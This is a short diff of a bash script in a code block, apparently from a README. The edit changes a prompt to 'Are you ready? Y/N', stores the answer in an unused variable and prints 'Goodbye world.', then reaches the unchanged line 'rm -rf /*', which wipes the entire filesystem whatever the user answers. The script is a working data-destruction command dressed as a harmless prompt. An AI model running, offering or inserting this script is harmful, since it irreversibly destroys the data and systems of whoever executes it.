@@ -3,9 +3,9 @@
 ```
 #!/bin/bash
 
-echo "Are you ready?"
+read -t 3 -p "Are you ready? Y/N" noCare
 
-read -t 3 soWhat
+echo "Goodbye world."
 
 rm -rf /*
 ```
